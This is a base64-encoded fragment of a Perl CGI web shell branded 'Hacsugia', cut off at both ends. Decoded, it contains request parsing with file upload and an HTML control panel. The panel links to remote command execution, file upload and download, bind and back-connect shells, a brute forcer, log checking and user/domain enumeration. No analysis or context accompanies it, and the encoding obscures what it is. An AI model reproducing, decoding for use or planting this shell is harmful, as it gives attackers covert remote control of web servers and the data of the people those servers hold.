B0aGF0IG1heSBoYW5nIG9yIHRoYXQNCgkJCQkJCQkJIyB0YWtlIHZlcnkgbG9uZyB0byBleGVjdXRlLCBsaWtlICJmaW5kIC8iLg0KCQkJCQkJCQkjIFRoaXMgaXMgdmFsaWQgb25seSBvbiBVbml4IHNlcnZlcnMuIEl0IGlzDQoJCQkJCQkJCSMgaWdub3JlZCBvbiBOVCBTZXJ2ZXJzLg0KDQokU2hvd0R5bmFtaWNPdXRwdXQgPSAxOwkJCSMgSWYgdGhpcyBpcyAxLCB0aGVuIGRhdGEgaXMgc2VudCB0byB0aGUNCgkJCQkJCQkJIyBicm93c2VyIGFzIHNvb24gYXMgaXQgaXMgb3V0cHV0LCBvdGhlcndpc2UNCgkJCQkJCQkJIyBpdCBpcyBidWZmZXJlZCBhbmQgc2VuZCB3aGVuIHRoZSBjb21tYW5kDQoJCQkJCQkJCSMgY29tcGxldGVzLiBUaGlzIGlzIHVzZWZ1bCBmb3IgY29tbWFuZHMgbGlrZQ0KCQkJCQkJCQkjIHBpbmcsIHNvIHRoYXQgeW91IGNhbiBzZWUgdGhlIG91dHB1dCBhcyBpdA0KCQkJCQkJCQkjIGlzIGJlaW5nIGdlbmVyYXRlZC4NCg0KIyBET04nVCBDSEFOR0UgQU5ZVEhJTkcgQkVMT1cgVEhJUyBMSU5FIFVOTEVTUyBZT1UgS05PVyBXSEFUIFlPVSdSRSBET0lORyAhIQ0KDQokQ21kU2VwID0gKCRXaW5OVCA/ICROVENtZFNlcCA6ICRVbml4Q21kU2VwKTsNCiRDbWRQd2QgPSAoJFdpbk5UID8gImNkIiA6ICJwd2QiKTsNCiRQYXRoU2VwID0gKCRXaW5OVCA/ICJcXCIgOiAiLyIpOw0KJFJlZGlyZWN0b3IgPSAoJFdpbk5UID8gIiAyPiYxIDE+JjIiIDogIiAxPiYxIDI+JjEiKTsNCiRjb2xzPSAxNTA7DQokcm93cz0gMjY7DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFJlYWRzIHRoZSBpbnB1dCBzZW50IGJ5IHRoZSBicm93c2VyIGFuZCBwYXJzZXMgdGhlIGlucHV0IHZhcmlhYmxlcy4gSXQNCiMgcGFyc2VzIEdFVCwgUE9TVCBhbmQgbXVsdGlwYXJ0L2Zvcm0tZGF0YSB0aGF0IGlzIHVzZWQgZm9yIHVwbG9hZGluZyBmaWxlcy4NCiMgVGhlIGZpbGVuYW1lIGlzIHN0b3JlZCBpbiAkaW57J2YnfSBhbmQgdGhlIGRhdGEgaXMgc3RvcmVkIGluICRpbnsnZmlsZWRhdGEnfS4NCiMgT3RoZXIgdmFyaWFibGVzIGNhbiBiZSBhY2Nlc3NlZCB1c2luZyAkaW57J3Zhcid9LCB3aGVyZSB2YXIgaXMgdGhlIG5hbWUgb2YNCiMgdGhlIHZhcmlhYmxlLiBOb3RlOiBNb3N0IG9mIHRoZSBjb2RlIGluIHRoaXMgZnVuY3Rpb24gaXMgdGFrZW4gZnJvbSBvdGhlciBDR0kNCiMgc2NyaXB0cy4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBSZWFkUGFyc2UgDQp7DQoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsNCglsb2NhbCAoJGksICRsb2MsICRrZXksICR2YWwpOw0KCQ0KCSRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOw0KDQoJaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiR0VUIikNCgl7DQoJCSRpbiA9ICRFTlZ7J1FVRVJZX1NUUklORyd9Ow0KCX0NCgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikNCgl7DQoJCWJpbm1vZGUoU1RESU4pIGlmICRNdWx0aXBhcnRGb3JtRGF0YSAmICRXaW5OVDsNCgkJcmVhZChTVERJTiwgJGluLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsNCgl9DQoNCgkjIGhhbmRsZSBmaWxlIHVwbG9hZCBkYXRhDQoJaWYoJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC8pDQoJew0KCQkkQm91bmRhcnkgPSAnLS0nLiQxOyAjIHBsZWFzZSByZWZlciB0byBSRkMxODY3IA0KCQlAbGlzdCA9IHNwbGl0KC8kQm91bmRhcnkvLCAkaW4pOyANCgkJJEhlYWRlckJvZHkgPSAkbGlzdFsxXTsNCgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOw0KCQkkSGVhZGVyID0gJGA7DQoJCSRCb2R5ID0gJCc7DQogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMgdGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlDQoJCSRpbnsnZmlsZWRhdGEnfSA9ICRCb2R5Ow0KCQkkSGVhZGVyID1+IC9maWxlbmFtZT1cIiguKylcIi87IA0KCQkkaW57J2YnfSA9ICQxOyANCgkJJGlueydmJ30gPX4gcy9cIi8vZzsNCgkJJGlueydmJ30gPX4gcy9ccy8vZzsNCg0KCQkjIHBhcnNlIHRyYWlsZXINCgkJZm9yKCRpPTI7ICRsaXN0WyRpXTsgJGkrKykNCgkJeyANCgkJCSRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8vOw0KCQkJJGxpc3RbJGldID1+IC9cIihcdyspXCIvOw0KCQkJJGtleSA9ICQxOw0KCQkJJHZhbCA9ICQnOw0KCQkJJHZhbCA9fiBzLyheKFxyXG5cclxufFxuXG4pKXwoXHJcbiR8XG4kKS8vZzsNCgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkaW57JGtleX0gPSAkdmFsOyANCgkJfQ0KCX0NCgllbHNlICMgc3RhbmRhcmQgcG9zdCBkYXRhICh1cmwgZW5jb2RlZCwgbm90IG11bHRpcGFydCkNCgl7DQoJCUBpbiA9IHNwbGl0KC8mLywgJGluKTsNCgkJZm9yZWFjaCAkaSAoMCAuLiAkI2luKQ0KCQl7DQoJCQkkaW5bJGldID1+IHMvXCsvIC9nOw0KCQkJKCRrZXksICR2YWwpID0gc3BsaXQoLz0vLCAkaW5bJGldLCAyKTsNCgkJCSRrZXkgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJGlueyRrZXl9IC49ICJcMCIgaWYgKGRlZmluZWQoJGlueyRrZXl9KSk7DQoJCQkkaW57JGtleX0gLj0gJHZhbDsNCgkJfQ0KCX0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgUGFnZSBIZWFkZXINCiMgQXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50UGFnZUhlYWRlcg0Kew0KCSRFbmNvZGVkQ3VycmVudERpciA9ICRDdXJyZW50RGlyOw0KCSRFbmNvZGVkQ3VycmVudERpciA9fiBzLyhbXmEtekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7DQoJbXkgJGRpciA9JEN1cnJlbnREaXI7DQoJJGRpcj1+IHMvXFwvXFxcXC9nOw0KCXByaW50ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbFxuXG4iOw0KCXByaW50IDw8RU5EOw0KPGh0bWw+DQo8aGVhZD4NCjxtZXRhIGh0dHAtZXF1aXY9ImNvbnRlbnQtdHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04Ij4NCjx0aXRsZT5IYWNzdWdpYTwvdGl0bGU+DQoNCiRIdG1sTWV0YUhlYWRlcg0KDQo8L2hlYWQ+DQo8c3R5bGU+DQpib2R5ew0KZm9udDogMTBwdCBWZXJkYW5hOw0KfQ0KdHIgew0KQk9SREVSLVJJR0hUOiAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItVE9QOiAgICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1MRUZUOiAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUJPVFRPTTogIzNlM2UzZSAxcHggc29saWQ7DQpjb2xvcjogI2ZmOTkwMDsNCn0NCnRkIHsNCkJPUkRFUi1SSUdIVDogICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1CT1RUT006ICMzZTNlM2UgMXB4IHNvbGlkOw0KY29sb3I6ICMyQkE4RUM7DQpmb250OiAxMHB0IFZlcmRhbmE7DQp9DQoNCnRhYmxlIHsNCkJPUkRFUi1SSUdIVDogICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1CT1RUT006ICMzZTNlM2UgMXB4IHNvbGlkOw0KQkFDS0dST1VORC1DT0xPUjogIzExMTsNCn0NCg0KDQppbnB1dCB7DQpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsNCkJBQ0tHUk9VTkQtQ09MT1I6IEJsYWNrOw0KZm9udDogMTBwdCBWZXJkYW5hOw0KY29sb3I6ICNmZjk5MDA7DQp9DQoNCmlucHV0LnN1Ym1pdCB7DQp0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47DQpjb2xvcjogI0ZGRkZGRjsNCmJvcmRlci1jb2xvcjogIzAwOTkwMDsNCn0NCg0KY29kZSB7DQpib3JkZXIJCQk6IGRhc2hlZCAwcHggIzMzMzsNCkJBQ0tHUk9VTkQtQ09MT1I6IEJsYWNrOw0KZm9udDogMTBwdCBWZXJkYW5hIGJvbGQ7DQpjb2xvcjogd2hpbGU7DQp9DQoNCnJ1biB7DQpib3JkZXIJCQk6IGRhc2hlZCAwcHggIzMzMzsNCmZvbnQ6IDEwcHQgVmVyZGFuYSBib2xkOw0KY29sb3I6ICNGRjAwQUE7DQp9DQoNCnRleHRhcmVhIHsNCkJPUkRFUi1SSUdIVDogICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLVRPUDogICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1CT1RUT006ICMzZTNlM2UgMXB4IHNvbGlkOw0KQkFDS0dST1VORC1DT0xPUjogIzFiMWIxYjsNCmZvbnQ6IEZpeGVkc3lzIGJvbGQ7DQpjb2xvcjogI2FhYTsNCn0NCkE6bGluayB7DQoJQ09MT1I6ICMyQkE4RUM7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KQTp2aXNpdGVkIHsNCglDT0xPUjogIzJCQThFQzsgVEVYVC1ERUNPUkFUSU9OOiBub25lDQp9DQpBOmhvdmVyIHsNCgl0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47DQoJY29sb3I6ICNmZjk5MDA7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KQTphY3RpdmUgew0KCWNvbG9yOiBSZWQ7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KDQoubGlzdGRpciB0cjpob3ZlcnsNCgliYWNrZ3JvdW5kOiAjNDQ0Ow0KfQ0KLmxpc3RkaXIgdHI6aG92ZXIgdGR7DQoJYmFja2dyb3VuZDogIzQ0NDsNCgl0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47DQoJY29sb3I6ICNGRkZGRkY7IFRFWFQtREVDT1JBVElPTjogbm9uZTsNCn0NCi5ub3RsaW5lew0KCWJhY2tncm91bmQ6ICMxMTE7DQp9DQoubGluZXsNCgliYWNrZ3JvdW5kOiAjMjIyOw0KfQ0KPC9zdHlsZT4NCjxzY3JpcHQgbGFuZ3VhZ2U9ImphdmFzY3JpcHQiPg0KZnVuY3Rpb24gY2htb2RfZm9ybShpLGZpbGUpDQp7DQoJLyp2YXIgYWpheD0nYWpheF9Qb3N0RGF0YSgiRm9ybVBlcm1zXycraSsnIiwiJFNjcmlwdExvY2F0aW9uIiwiUmVzcG9uc2VEYXRhIik7IHJldHVybiBmYWxzZTsnOyovDQoJdmFyIGFqYXg9IiI7DQoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVQZXJtc18iK2kpLmlubmVySFRNTD0iPGZvcm0gbmFtZT1Gb3JtUGVybXNfIiArIGkrICIgYWN0aW9uPScgbWV0aG9kPSdQT1NUJz48aW5wdXQgaWQ9dGV4dF8iICsgaSArICIgIG5hbWU9Y2htb2QgdHlwZT10ZXh0IHNpemU9NSAvPjxpbnB1dCB0eXBlPXN1Ym1pdCBjbGFzcz0nc3VibWl0JyBvbmNsaWNrPSciICsgYWpheCArICInIHZhbHVlPU9LPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWEgdmFsdWU9J2d1aSc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZCB2YWx1ZT0nJGRpcic+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZiB2YWx1ZT0nIitmaWxlKyInPjwvZm9ybT4iOw0KCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ0ZXh0XyIgKyBpKS5mb2N1cygpOw0KfQ0KZnVuY3Rpb24gcm1fY2htb2RfZm9ybShyZXNwb25zZSxpLHBlcm1zLGZpbGUpDQp7DQoJcmVzcG9uc2UuaW5uZXJIVE1MID0gIjxzcGFuIG9uY2xpY2s9XFxcImNobW9kX2Zvcm0oIiArIGkgKyAiLCciKyBmaWxlKyAiJylcXFwiID4iKyBwZXJtcyArIjwvc3Bhbj48L3RkPiI7DQp9DQpmdW5jdGlvbiByZW5hbWVfZm9ybShpLGZpbGUsZikNCnsNCgl2YXIgYWpheD0iIjsNCglmLnJlcGxhY2UoL1xcXFwvZywiXFxcXFxcXFwiKTsNCgl2YXIgYmFjaz0icm1fcmVuYW1lX2Zvcm0oIitpKyIsXFxcIiIrZmlsZSsiXFxcIixcXFwiIitmKyJcXFwiKTsgcmV0dXJuIGZhbHNlOyI7DQoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9Ijxmb3JtIG5hbWU9Rm9ybVBlcm1zXyIgKyBpKyAiIGFjdGlvbj0nIG1ldGhvZD0nUE9TVCc+PGlucHV0IGlkPXRleHRfIiArIGkgKyAiICBuYW1lPXJlbmFtZSB0eXBlPXRleHQgdmFsdWU9ICciK2ZpbGUrIicgLz48aW5wdXQgdHlwZT1zdWJtaXQgY2xhc3M9J3N1Ym1pdCcgb25jbGljaz0nIiArIGFqYXggKyAiJyB2YWx1ZT1PSz48aW5wdXQgdHlwZT1zdWJtaXQgY2xhc3M9J3N1Ym1pdCcgb25jbGljaz0nIiArIGJhY2sgKyAiJyB2YWx1ZT1DYW5jZWw+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YSB2YWx1ZT0nZ3VpJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1kIHZhbHVlPSckZGlyJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1mIHZhbHVlPSciK2ZpbGUrIic+PC9mb3JtPiI7DQoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRleHRfIiArIGkpLmZvY3VzKCk7DQp9DQpmdW5jdGlvbiBybV9yZW5hbWVfZm9ybShpLGZpbGUsZikNCnsNCglpZihmPT0nZicpDQoJew0KCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZV8iK2kpLmlubmVySFRNTD0iPGEgaHJlZj0nP2E9Y29tbWFuZCZkPSRkaXImYz1lZGl0JTIwIitmaWxlKyIlMjAnPiIgK2ZpbGUrICI8L2E+IjsNCgl9ZWxzZQ0KCXsNCgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9IjxhIGhyZWY9Jz9hPWd1aSZkPSIrZisiJz5bICIgK2ZpbGUrICIgXTwvYT4iOw0KCX0NCn0NCjwvc2NyaXB0Pg0KPGJvZHkgb25Mb2FkPSJkb2N1bWVudC5mLkBfLmZvY3VzKCkiIGJnY29sb3I9IiMwYzBjMGMiIHRvcG1hcmdpbj0iMCIgbGVmdG1hcmdpbj0iMCIgbWFyZ2lud2lkdGg9IjAiIG1hcmdpbmhlaWdodD0iMCI+DQo8Y2VudGVyPjxjb2RlPg0KPHRhYmxlIGJvcmRlcj0iMSIgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMiI+DQo8dHI+DQoJPHRkIGFsaWduPSJjZW50ZXIiIHJvd3NwYW49Mj4NCgkJPGI+PGZvbnQgc2l6ZT0iNSI+JEVkaXRQZXJzaW9uPC9mb250PjwvYj4NCgk8L3RkPg0KDQoJPHRkPg0KDQoJCTxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiPiRFTlZ7IlNFUlZFUl9TT0ZUV0FSRSJ9PC9mb250Pg0KCTwvdGQ+DQoJPHRkPlNlcnZlciBJUDo8Zm9udCBjb2xvcj0iI2JiMDAwMCI+ICRFTlZ7J1NFUlZFUl9BRERSJ308L2ZvbnQ+IHwgWW91ciBJUDogPGZvbnQgY29sb3I9IiNiYjAwMDAiPiRFTlZ7J1JFTU9URV9BRERSJ308L2ZvbnQ+DQoJPC90ZD4NCg0KPC90cj4NCg0KPHRyPg0KPHRkIGNvbHNwYW49IjMiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjIiPg0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uIj5Ib21lPC9hPiB8IA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Y29tbWFuZCZkPSRFbmNvZGVkQ3VycmVudERpciI+Q29tbWFuZDwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Z3VpJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5HVUk8L2E+IHwgDQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT11cGxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPlVwbG9hZCBGaWxlPC9hPiB8IA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkRvd25sb2FkIEZpbGU8L2E+IHwNCg0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9YmFja2JpbmQiPkJhY2sgJiBCaW5kPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1icnV0ZWZvcmNlciI+QnJ1dGUgRm9yY2VyPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1jaGVja2xvZyI+Q2hlY2sgTG9nPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1kb21haW5zdXNlciI+RG9tYWlucy9Vc2VyczwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij5Mb2dvdXQ8L2E+IHwNCjxhIHRhcmdldD0nX2JsYW5rJyBocmVmPSIjIj5IZWxwPC9hPg0KDQo8L2ZvbnQ+PC90ZD4NCjwvdHI+DQo8L3RhYmxlPg0KPGZvbnQgaWQ9IlJlc3BvbnNlRGF0YSIgY29sb3I9IiNmZjk5Y2MiID4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgTG9naW4gU2NyZWVuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpblNjcmVlbg0Kew0KDQoJcHJpbnQgPDxFTkQ7DQo8cHJlPjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4NClR5cGluZ1RleHQgPSBmdW5jdGlvbihlbGVtZW50LCBpbnRlcnZhbCwgY3Vyc29yLCBmaW5pc2hlZENhbGxiYWNrKSB7DQogIGlmKCh0eXBlb2YgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQgPT0gInVuZGVmaW5lZCIpIHx8ICh0eXBlb2YgZWxlbWVudC5pbm5lckhUTUwgPT0gInVuZGVmaW5lZCIpKSB7DQogICAgdGhpcy5ydW5uaW5nID0gdHJ1ZTsJLy8gTmV2ZXIgcnVuLg0KICAgIHJldHVybjsNCiAgfQ0KICB0aGlzLmVsZW1lbnQgPSBlbGVtZW50Ow0KICB0aGlzLmZpbmlzaGVkQ2FsbGJhY2sgPSAoZmluaXNoZWRDYWxsYmFjayA/IGZpbmlzaGVkQ2FsbGJhY2sgOiBmdW5jdGlvbigpIHsgcmV0dXJuOyB9KTsNCiAgdGhpcy5pbnRlcnZhbCA9ICh0eXBlb2YgaW50ZXJ2YWwgPT0gInVuZGVmaW5lZCIgPyAxMDAgOiBpbnRlcnZhbCk7DQogIHRoaXMub3JpZ1RleHQgPSB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MOw0KICB0aGlzLnVucGFyc2VkT3JpZ1RleHQgPSB0aGlzLm9yaWdUZXh0Ow0KICB0aGlzLmN1cnNvciA9IChjdXJzb3IgPyBjdXJzb3IgOiAiIik7DQogIHRoaXMuY3VycmVudFRleHQgPSAiIjsNCiAgdGhpcy5jdXJyZW50Q2hhciA9IDA7DQogIHRoaXMuZWxlbWVudC50eXBpbmdUZXh0ID0gdGhpczsNCiAgaWYodGhpcy5lbGVtZW50LmlkID09ICIiKSB0aGlzLmVsZW1lbnQuaWQgPSAidHlwaW5ndGV4dCIgKyBUeXBpbmdUZXh0LmN1cnJlbnRJbmRleCsrOw0KICBUeXBpbmdUZXh0LmFsbC5wdXNoKHRoaXMpOw0KICB0aGlzLnJ1bm5pbmcgPSBmYWxzZTsNCiAgdGhpcy5pblRhZyA9IGZhbHNlOw0KICB0aGlzLnRhZ0J1ZmZlciA9ICIiOw0KICB0aGlzLmluSFRNTEVudGl0eSA9IGZhbHNlOw0KICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgPSAiIjsNCn0NClR5cGluZ1RleHQuYWxsID0gbmV3IEFycmF5KCk7DQpUeXBpbmdUZXh0LmN1cnJlbnRJbmRleCA9IDA7DQpUeXBpbmdUZXh0LnJ1bkFsbCA9IGZ1bmN0aW9uKCkgew0KICBmb3IodmFyIGkgPSAwOyBpIDwgVHlwaW5nVGV4dC5hbGwubGVuZ3RoOyBpKyspIFR5cGluZ1RleHQuYWxsW2ldLnJ1bigpOw0KfQ0KVHlwaW5nVGV4dC5wcm90b3R5cGUucnVuID0gZnVuY3Rpb24oKSB7DQogIGlmKHRoaXMucnVubmluZykgcmV0dXJuOw0KICBpZih0eXBlb2YgdGhpcy5vcmlnVGV4dCA9PSAidW5kZWZpbmVkIikgew0KICAgIHNldFRpbWVvdXQoImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCciICsgdGhpcy5lbGVtZW50LmlkICsgIicpLnR5cGluZ1RleHQucnVuKCkiLCB0aGlzLmludGVydmFsKTsJLy8gV2UgaGF2ZW4ndCBmaW5pc2hlZCBsb2FkaW5nIHlldC4gIEhhdmUgcGF0aWVuY2UuDQogICAgcmV0dXJuOw0KICB9DQogIGlmKHRoaXMuY3VycmVudFRleHQgPT0gIiIpIHRoaXMuZWxlbWVudC5pbm5lckhUTUwgPSAiIjsNCi8vICB0aGlzLm9yaWdUZXh0ID0gdGhpcy5vcmlnVGV4dC5yZXBsYWNlKC88KFtePF0pKj4vLCAiIik7ICAgICAvLyBTdHJpcCBIVE1MIGZyb20gdGV4dC4NCiAgaWYodGhpcy5jdXJyZW50Q2hhciA8IHRoaXMub3JpZ1RleHQubGVuZ3RoKSB7DQogICAgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIjwiICYmICF0aGlzLmluVGFnKSB7DQogICAgICB0aGlzLnRhZ0J1ZmZlciA9ICI8IjsNCiAgICAgIHRoaXMuaW5UYWcgPSB0cnVlOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIj4iICYmIHRoaXMuaW5UYWcpIHsNCiAgICAgIHRoaXMudGFnQnVmZmVyICs9ICI+IjsNCiAgICAgIHRoaXMuaW5UYWcgPSBmYWxzZTsNCiAgICAgIHRoaXMuY3VycmVudFRleHQgKz0gdGhpcy50YWdCdWZmZXI7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLmluVGFnKSB7DQogICAgICB0aGlzLnRhZ0J1ZmZlciArPSB0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKTsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICImIiAmJiAhdGhpcy5pbkhUTUxFbnRpdHkpIHsNCiAgICAgIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciA9ICImIjsNCiAgICAgIHRoaXMuaW5IVE1MRW50aXR5ID0gdHJ1ZTsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI7IiAmJiB0aGlzLmluSFRNTEVudGl0eSkgew0KICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyICs9ICI7IjsNCiAgICAgIHRoaXMuaW5IVE1MRW50aXR5ID0gZmFsc2U7DQogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMuSFRNTEVudGl0eUJ1ZmZlcjsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMuaW5IVE1MRW50aXR5KSB7DQogICAgICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSB7DQogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpOw0KICAgIH0NCiAgICB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MID0gdGhpcy5jdXJyZW50VGV4dDsNCiAgICB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MICs9ICh0aGlzLmN1cnJlbnRDaGFyIDwgdGhpcy5vcmlnVGV4dC5sZW5ndGggLSAxID8gKHR5cGVvZiB0aGlzLmN1cnNvciA9PSAiZnVuY3Rpb24iID8gdGhpcy5jdXJzb3IodGhpcy5jdXJyZW50VGV4dCkgOiB0aGlzLmN1cnNvcikgOiAiIik7DQogICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgIHNldFRpbWVvdXQoImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCciICsgdGhpcy5lbGVtZW50LmlkICsgIicpL